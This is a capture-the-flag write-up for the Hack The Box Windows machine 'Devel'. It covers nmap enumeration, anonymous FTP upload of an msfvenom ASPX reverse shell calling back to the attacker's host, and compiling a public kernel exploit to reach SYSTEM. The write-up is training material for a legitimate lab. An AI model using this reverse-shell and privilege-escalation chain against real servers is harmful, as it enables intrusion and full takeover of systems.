---
title: "Devel"
difficulty: Easy
os: Windows
points: 20
rating: 4.8
date: 2017-03-15
avatar: assets/htb/devel.png
tags: [Remote Code Execution, Arbitrary File Upload, ASP, IIS, FTP, Enterprise Network, Protocols]
htb_url: https://app.hackthebox.com/machines/Devel
---
## Summary

Devel is an easy Windows box running IIS 7.5 and Microsoft FTP. Anonymous FTP access maps directly to the webroot, so I uploaded an ASPX reverse shell and got code execution as the low-privileged IIS app pool account. From there an old kernel (Windows build 6.1.7600) let me escalate to `nt authority\system` with a public local privilege-escalation exploit and grab both flags.

Target IP: `<YOUR_IP>`

I set up a host entry and a working directory for scans before getting started:

```bash
su
echo "<YOUR_IP> devel.htb" >> /etc/hosts

mkdir htb/devel.htb
cd htb/devel.htb

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

## Enumeration

I usually kick off recon with a ping against the target, which confirms connectivity and gives us a hint about the OS.

```bash
ping -c 3 devel.htb    
PING devel.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=1 ttl=127 time=57.1 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=2 ttl=127 time=53.6 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=3 ttl=127 time=56.2 ms
```

From these three ICMP replies the Time To Live (TTL) sits around 128, which points to a Windows host, since \*nix boxes typically report a TTL of about 64.

### Port scan

A full TCP port sweep reveals only two open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 devel.htb -oG port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 15:32 EDT
Initiating SYN Stealth Scan at 15:32
Scanning devel.htb (<YOUR_IP>) [65536 ports]
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 21/tcp on <YOUR_IP>
Completed SYN Stealth Scan at 15:32, 26.41s elapsed (65536 total ports)
Nmap scan report for devel.htb (<YOUR_IP>)
Host is up, received user-set (0.057s latency).
Scanned at 2023-07-24 15:32:23 EDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

The two open ports on the box are 21 and 80. Next I ran a targeted service/version scan against them to identify what is listening, paying particular attention to FTP on port 21:

```bash
nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 devel.htb -oN open_ports
```

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 07-24-23  11:15AM               241062 40564.exe
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-24-23  01:26AM                 1442 cmdasp.aspx
| 07-24-23  12:36AM                 2914 devel.aspx
| 07-24-23  01:04AM                 2886 devel1.aspx
| 07-24-23  04:44PM                 2917 devel2.aspx
| 07-24-23  02:11AM                 2749 develshell.aspx
| 07-24-23  11:09AM                15966 fox.aspx
| 07-24-23  09:26AM                 2906 hacked.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-24-23  07:16PM                    0 killbill.aspx
| 07-24-23  07:21PM                 2912 killbill1.aspx
| 07-24-23  12:17AM                 2783 pwned.aspx
| 07-24-23  03:00PM                 2923 rev.aspx
| 07-24-23  09:21PM                15969 shell.aspx
| 07-24-23  03:34PM                73802 virus.exe
| 07-24-23  12:34AM               112815 virus2.exe
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The service on TCP 21 is **Microsoft ftpd**, and port 80 is **Microsoft IIS httpd 7.5**. Crucially, `ftp-anon` shows anonymous FTP login is allowed and the listing already contains a pile of `.aspx` files and `iisstart.htm` — strong indication that the FTP root is the IIS webroot.

The flags used in the version scan break down as follows:

| command | result |
| --- | --- |
| sudo | run as root |
| sC | run default scripts |
| sV | enumerate versions |
| A | aggressive mode |
| T4 | run a bit faster |
| oN | output to file with nmap formatting |

### Confirming anonymous FTP and webroot mapping

I logged into FTP anonymously to confirm the access and look at the available commands:

```bash
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> help
Commands may be abbreviated.  Commands are:

!		cr		ftp		macdef		msend		prompt		restart		sunique
$		debug		gate		mdelete		newer		proxy		rhelp		system
account		delete		get		mdir		nlist		put		rmdir		tenex
append		dir		glob		mget		nmap		pwd		rstatus		throttle
ascii		disconnect	hash		mkdir		ntrans		quit		runique		trace
bell		edit		help		mls		open		quote		send		type
binary		epsv		idle		mlsd		page		rate		sendport	umask
bye		epsv4		image		mlst		passive		rcvbuf		set		unset
case		epsv6		lcd		mode		pdir		recv		site		usage
cd		exit		less		modtime		pls		reget		size		user
cdup		features	lpage		more		pmlsd		remopts		sndbuf		verbose
chmod		fget		lpwd		mput		preserve	rename		status		xferbuf
close		form		ls		mreget		progress	reset		struct		?
```

The `put` command is what lets us upload a single file at a time. To verify the FTP root is served by the webserver, I uploaded the nmap output file (`port_scan`) and checked that it appeared in the listing:

```bash
ftp> put port_scan 
```

```bash
ftp> put port_scan 
local: port_scan remote: port_scan
229 Entering Extended Passive Mode (|||49219|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************|   464        8.84 MiB/s    --:-- ETA
226 Transfer complete.
464 bytes sent in 00:00 (7.98 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

The file lands in the same directory the webserver serves, so anything uploaded over FTP is reachable through IIS. Since this is an IIS box, the file extension executed as a script here is **aspx** — uploading a `.aspx` file and requesting it through the webserver gives us code execution.

## Foothold

With the anonymous-write FTP root mapped to the IIS webroot, the path to a shell is to upload an ASPX reverse shell and execute it via the browser. I generated the payload with msfvenom, where `LHOST` is our local IP and `LPORT` is the port netcat will listen on for the callback:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f aspx > exploit.aspx
Payload size: 327 bytes
Final size of aspx file: 2748 bytes
```

Then I uploaded it over FTP:

```bash
ftp> put script.aspx
local: script.aspx remote: script.aspx
229 Entering Extended Passive Mode (|||49224|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|  2748        1.12 MiB/s    --:-- ETA
226 Transfer complete.
2748 bytes sent in 00:00 (45.20 KiB/s)
```

With netcat listening on port 444, I requested the script in the browser to trigger the callback and check who we are:

```bash
c:\Windows>whoami
whoami
iis apppool\web
```

We landed as the `iis apppool\web` account. The user flag should be under the `babis` user's desktop, but we can't reach that directory directly with these low privileges. A quick search for `user.txt` from the C:\ root turns up nothing accessible yet:

```bash
where /r C:\ user.txt
```

No luck — we'll need to escalate privileges first.

## Privilege Escalation

I ran `systeminfo` to gather details about the OS:

```
systeminfo
```

```
OS Version: 6.1.7600 N/A Build 7600
```

That build is old and unpatched. A quick search turns up this [exploit](https://www.exploit-db.com/exploits/40564) matching the OS version. (Metasploit's own `post/multi/recon/local_exploit_suggester` module is the standard way to enumerate these privilege-escalation paths automatically.)

I grabbed the `40564.c` source and compiled it with mingw32:

```bash
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

Then I reconnected over FTP in binary mode and uploaded `exploit.exe`. From the shell, I located it with `where` and executed it to escalate:

```bash
where /r C:\ exploit.exe
c:\inetpub\wwwroot>exploit.exe
whoami
nt authority\system
```

Now running as `nt authority\system`, I can read everything. Starting from the root folder (C:\), the flags are quick to locate using `where` in recursive mode (`/r`):

```
where /r C:\ user.txt
C:\Users\babis\Desktop\user.txt
```

Printing the user.txt flag with the `type` command (the Windows equivalent of `cat` on \*nix):

```
type C:\Users\babis\Desktop\user.txt
```

**user.txt** — `5d3f************************16bd`

The same approach gets us the root flag:

```bash
where /r C:\ root.txt
C:\Users\Administrator\Desktop\root.txt
```

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**root.txt** — `cb43************************2f32`

---
